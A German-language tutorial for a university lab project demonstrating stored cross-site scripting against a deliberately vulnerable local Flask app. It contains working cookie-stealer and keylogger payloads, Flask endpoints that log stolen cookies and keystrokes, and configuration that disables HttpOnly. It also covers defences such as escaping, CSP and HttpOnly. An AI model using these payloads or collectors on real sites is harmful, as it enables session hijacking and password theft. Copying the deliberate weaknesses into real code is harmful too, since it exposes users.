# XSS Demo Anleitung - HackingWithPython

## ⚠️ Wichtiger Hinweis
Diese Anleitung ist ausschließlich für **Bildungszwecke** in einer **kontrollierten Labor-Umgebung** gedacht. Die Verwendung dieser Techniken gegen echte Systeme ohne ausdrückliche Genehmigung ist illegal.

---

## 🎯 Übersicht

Dein Projekt demonstriert einen **Stored XSS (Cross-Site Scripting)** Angriff. Der Angriffscode wird in der Datenbank gespeichert und bei jedem Seitenaufruf ausgeführt.

### Was du hast:
1. **Flask-Anwendung** (`app.py`) - Deine verwundbare Webanwendung MIT bereits integrierten Endpoints
2. **Cookie-Stealer Payload** (`payload_cookie_stealer.js`)
3. **Keylogger Payload** (`payload_keylogger.js`)

---

## 🚀 Schritt-für-Schritt Anleitung

### 1. Server starten

Dein Flask-Server (`app.py`) läuft auf Port 5001 und enthält bereits die benötigten Endpoints:
- `/steal_cookie` (Zeile 216-232) - empfängt gestohlene Cookies
- `/log_keys` (Zeile 234-246) - empfängt Keylogger-Daten

```bash
python app.py
```

Der Server ist jetzt auf `http://127.0.0.1:5001` erreichbar.

---

### 2. Cookie-Diebstahl Demo

#### Schritt A: Payload einfügen
1. Öffne die Webanwendung im Browser: `http://127.0.0.1:5001`
2. Registriere einen neuen User oder logge dich ein
3. Navigiere zu einer Seite mit Eingabefeld (z.B. `/posts` oder `/edit_bio/<user_id>`)
4. Füge diesen Payload ein:

```html
<script>fetch('http://127.0.0.1:5001/steal_cookie?c='+document.cookie)</script>
```

5. Speichere den Post/Bio-Eintrag

#### Schritt B: Angriff auslösen
1. Öffne die Seite mit einem **anderen Browser** oder **Inkognito-Modus** (simuliert ein Opfer)
2. Logge dich als anderer User ein
3. Besuche die Seite, wo der Payload gespeichert ist (z.B. `/posts` oder `/users`)

#### Schritt C: Ergebnisse prüfen
- **In der Terminal-Konsole** siehst du:
  ```
  ============================================================
  COOKIE STOLEN
  ============================================================
  Victim IP: 127.0.0.1
  Cookie: session=eyJ1c2VyIjp7ImlkIjoxLCJ1c2VybmFtZSI6InRlc3QifX0.Z...
  ============================================================
  ```

- **In `stolen_cookies.txt`**:
  ```
  [127.0.0.1] session=eyJ1c2VyIjp7ImlkIjoxLCJ1c2VybmFtZSI6InRlc3QifX0.Z...
  ```

---

### 3. Keylogger Demo

#### Schritt A: Payload einfügen
1. Gehe zu `/posts` oder `/edit_bio/<user_id>`
2. Füge diesen Payload ein (Zeit-basierter Keylogger, sendet alle 3 Sekunden):

```html
<script>let buffer='';document.addEventListener('keypress',function(e){buffer+=e.key;});setInterval(function(){if(buffer.length>0){fetch('http://127.0.0.1:5001/log_keys',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'keys='+encodeURIComponent(buffer)});buffer='';}},3000);</script>
```

3. Speichere den Eintrag

#### Schritt B: Angriff auslösen
1. Öffne die Seite in einem anderen Browser/Tab
2. Tippe auf der Seite (z.B. in Suchfelder, Textfelder, etc.)
3. Warte 3 Sekunden

#### Schritt C: Ergebnisse prüfen
- **In der Terminal-Konsole**:
  ```
  KEYLOG [127.0.0.1]: password123
  KEYLOG [127.0.0.1]: secret message
  ```

- **In `keylog.txt`**:
  ```
  [127.0.0.1] password123
  [127.0.0.1] secret message
  ```

---

## 📋 Payload-Varianten

### Cookie-Stealer Varianten

| Variante | Code | Verwendung |
|----------|------|------------|
| **Basis** | `<script>fetch('http://127.0.0.1:5001/steal_cookie?c='+document.cookie)</script>` | Standard, funktioniert in den meisten Fällen |
| **Image-Tag** | `<img src=x onerror="fetch('http://127.0.0.1:5001/steal_cookie?c='+document.cookie)">` | Wenn `<script>` gefiltert wird |
| **XMLHttpRequest** | Siehe `payload_cookie_stealer.js` Variante 4 | Für ältere Browser |

### Keylogger Varianten

| Variante | Beschreibung | Empfohlen für |
|----------|--------------|---------------|
| **Batch (10 Zeichen)** | Sendet nach 10 Tastenanschlägen | Schnelle Tests |
| **Sofort** | Sendet jeden Tastendruck einzeln | Demo-Zwecke (sichtbar im Network-Tab) |
| **Zeit-Intervall (3s)** | Sendet alle 3 Sekunden | **Empfohlen** - realistisch |
| **keydown Event** | Erfasst auch Spezialstasten | Erweiterte Analyse |

---

## 🔍 Was du in deinem Code findest

### app.py (Zeile 216-246)

```python
@app.route("/steal_cookie", methods=["GET", "POST"])
def steal_cookie():
    """Endpoint zum Empfangen gestohlener Cookies"""
    cookie = request.args.get("c") or request.form.get("c", "")
    victim_ip = get_remote_address()

    print("\n" + "="*60)
    print("COOKIE STOLEN")
    print("="*60)
    print(f"Victim IP: {victim_ip}")
    print(f"Cookie: {cookie}")
    print("="*60 + "\n")

    with open("stolen_cookies.txt", "a") as f:
        f.write(f"[{victim_ip}] {cookie}\n")

    return "", 200

@app.route("/log_keys", methods=["POST"])
def log_keys():
    """Endpoint zum Empfangen von Keylogger-Daten"""
    keys = request.form.get("keys", "")
    victim_ip = get_remote_address()

    if keys:
        print(f"\nKEYLOG [{victim_ip}]: {keys}")

        with open("keylog.txt", "a") as f:
            f.write(f"[{victim_ip}] {keys}\n")

    return "", 200
```

### Wichtige Konfiguration (Zeile 11-13)

```python
# XSS DEMO: HttpOnly Cookie deaktivieren (damit document.cookie funktioniert)
app.config['SESSION_COOKIE_HTTPONLY'] = False
app.config['SESSION_COOKIE_SAMESITE'] = None
```

**Warum?** In produktiven Anwendungen sollte `HttpOnly=True` gesetzt sein, um Cookie-Diebstahl zu verhindern. Für die Demo ist es deaktiviert.

---

## 🛡️ Schutzmechanismen (Was fehlt?)

Deine App ist **absichtlich verwundbar**. In einer echten Anwendung würde man:

### 1. **Input Sanitization**
```python
import html
bio = html.escape(request.form.get("bio", ""))  # Escaped HTML
```

### 2. **Content Security Policy (CSP)**
```python
@app.after_request
def set_csp(response):
    response.headers['Content-Security-Policy'] = "default-src 'self'; script-src 'self'"
    return response
```

### 3. **HttpOnly Cookies**
```python
app.config['SESSION_COOKIE_HTTPONLY'] = True  # Verhindert document.cookie Zugriff
```

### 4. **Output Encoding in Templates**
Jinja2 escaped automatisch, ABER nur wenn man `{{ variable }}` statt `{{ variable|safe }}` verwendet.

Prüfe deine Templates:
```bash
grep -r "|safe" templates/
grep -r "autoescape false" templates/
```

---

## 🧪 Test-Szenarien

### Szenario 1: Cookie-Session-Hijacking
1. User A fügt Cookie-Stealer in Bio ein
2. User B besucht User A's Profil auf `/users`
3. User B's Session-Cookie wird gestohlen
4. Attacker kann die Session kopieren und sich als User B ausgeben

### Szenario 2: Passwort-Diebstahl via Keylogger
1. Attacker fügt Keylogger in beliebten Post ein
2. User besucht `/posts` und sieht den Post
3. User gibt irgendwo Passwort ein (z.B. Login in anderem Tab)
4. Keylogger sendet Passwort an Attacker-Server

### Szenario 3: Kombinierter Angriff
1. Cookie-Stealer + Keylogger im selben Payload:
```html
<script>
fetch('http://127.0.0.1:5001/steal_cookie?c='+document.cookie);
let k='';
document.onkeypress=e=>{k+=e.key;if(k.length>10){fetch('http://127.0.0.1:5001/log_keys',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'keys='+k});k=''}};
</script>
```

---

## 📊 Monitoring

### Live-Monitoring in der Konsole
Beim Start von `python app.py` siehst du live:
- Alle eingehenden Cookies
- Alle Keylogger-Daten

### Datei-basiertes Logging
- `stolen_cookies.txt` - alle gestohlenen Cookies mit Timestamp
- `keylog.txt` - alle geloggten Tastenanschläge

### Browser DevTools
- **Network Tab**: Zeigt Requests zu `/steal_cookie` und `/log_keys`
- **Console Tab**: JavaScript-Fehler (falls Payload fehlschlägt)

---

## ❓ Troubleshooting

### Problem: Cookie wird nicht gestohlen
- **Check 1**: Ist `SESSION_COOKIE_HTTPONLY = False` in `app.py`?
- **Check 2**: Öffne Browser DevTools → Console → tippe `document.cookie` - siehst du den Cookie?
- **Check 3**: Läuft der Flask-Server auf Port 5001?

### Problem: Keylogger funktioniert nicht
- **Check 1**: Öffne Browser DevTools → Network Tab - siehst du POST-Requests zu `/log_keys`?
- **Check 2**: Teste in Console: `document.onkeypress = e => console.log(e.key)` und tippe
- **Check 3**: CORS-Problem? Prüfe Server-Logs

### Problem: Payload wird als Text angezeigt
- **Ursache**: Die Anwendung escaped HTML korrekt (nicht verwundbar für XSS)
- **Lösung**: Prüfe Templates - wird `|safe` verwendet oder `autoescape false`?
- **Für Demo**: Ändere Template zu `{{ content|safe }}` (macht es verwundbar)

---

## 🎓 Lernziele

Nach dieser Demo solltest du verstehen:
1. ✅ Wie **Stored XSS** funktioniert
2. ✅ Warum **Input Sanitization** wichtig ist
3. ✅ Warum **HttpOnly Cookies** Cookie-Diebstahl verhindern
4. ✅ Wie **Event Listeners** in JavaScript funktionieren
5. ✅ Wie Attacker **Cross-Origin Requests** nutzen

---

## 📚 Weiterführende Ressourcen

- **OWASP XSS Guide**: https://owasp.org/www-community/attacks/xss/
- **PortSwigger Web Security Academy**: https://portswigger.net/web-security/cross-site-scripting
- **CSP Reference**: https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP

---

## ✅ Checkliste für Präsentation

- [ ] Flask-Server läuft auf Port 5001
- [ ] MySQL-Datenbank läuft und `hackingdb` existiert
- [ ] 2-3 Test-User angelegt
- [ ] Browser DevTools geöffnet (Network + Console Tab)
- [ ] `stolen_cookies.txt` und `keylog.txt` gelöscht (für frische Demo)
- [ ] Backup: Screenshots von erfolgreichen Angriffen

---

**Viel Erfolg bei deinem Uni-Projekt! 🎓**
